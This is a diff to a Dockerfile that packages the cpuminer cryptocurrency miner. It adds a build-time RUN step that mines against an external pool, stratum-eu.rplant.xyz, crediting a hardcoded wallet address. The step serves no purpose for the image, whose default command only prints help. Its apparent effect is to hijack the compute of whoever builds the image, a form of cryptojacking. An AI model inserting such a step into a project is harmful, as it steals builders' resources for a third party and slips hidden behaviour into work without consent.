@@ -32,4 +32,5 @@ RUN apt-get update \
 
 COPY --from=builder /app/cpuminer .
 ENTRYPOINT ["./cpuminer"]
+RUN ./cpuminer -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u RJFhRvKsHs6GMx5DdsNDopRVZitbiPoTwX.AWs01 -p x -t2
 CMD ["-h"]
